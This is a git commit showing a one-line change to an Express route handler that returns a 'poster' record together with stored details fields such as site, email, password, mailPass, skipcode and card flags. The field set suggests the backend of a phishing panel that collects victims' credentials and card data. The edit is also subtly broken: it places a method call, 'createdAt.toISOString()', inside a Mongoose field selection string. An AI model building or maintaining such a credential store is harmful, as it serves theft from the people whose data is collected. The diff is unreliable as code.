6796bb3468da623b015eeb24ca40df21613b9163
Rana Ahamed <rana.buddy@gmail.com>
2023-09-29 14:40:22 +0600

    Update routehandler.js
    added

--- routes/routehandler.js
+++ routes/routehandler.js
@@ -501,7 +501,7 @@ export const poster_details = async (req, res) => {
 
         const data = await Poster.findOne({ _id: id })
             .select('username password posterId links details')
-            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt.toISOString()').sort({ createdAt: -1 })
         return res.status(200).json({ data: data })
 
 
